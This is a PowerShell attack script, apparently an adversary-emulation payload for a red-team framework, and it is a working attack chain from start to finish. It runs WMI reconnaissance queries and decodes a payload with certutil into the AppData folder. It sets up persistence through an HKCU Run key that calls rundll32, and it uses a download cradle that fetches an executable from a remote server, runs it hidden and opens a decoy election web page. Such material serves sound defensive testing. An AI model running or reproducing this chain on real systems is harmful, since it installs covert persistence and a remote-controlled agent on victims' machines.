gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_BIOS"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_PnPEntity"
gwmi -namespace root\cimv2 -query "Select * from Win32_ComputerSystem"
gwmi -namespace root\cimv2 -query "SELECT * FROM Win32_Process"
(Get-Item -Path ".\" -Verbose).FullName
$bin = ""
$bin | Add-Content -Path blob
certutil -decode blob "$env:appdata\Microsoft\kxwn.lock"
Remove-Item -Path blob
New-ItemProperty -Force -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WebCache" -Value "C:\windows\system32\rundll32.exe $env:appdata\Microsoft\kxwn.lock,VoidFunc"
$ps_cradle = '$server="http://192.168.0.4:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);$name="iex-cradle";get-process | ? {$_.modules.filename -like "C:\Users\Public\$name.exe"} | stop-process -f;rm -force "C:\Users\Public\$name.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\$name.exe -ArgumentList "-server $server -group iex-cradle" -WindowStyle hidden;'
IEX($ps_cradle)
Invoke-Item '2016_United_States_presidential_election_-_Wikipedia.html'
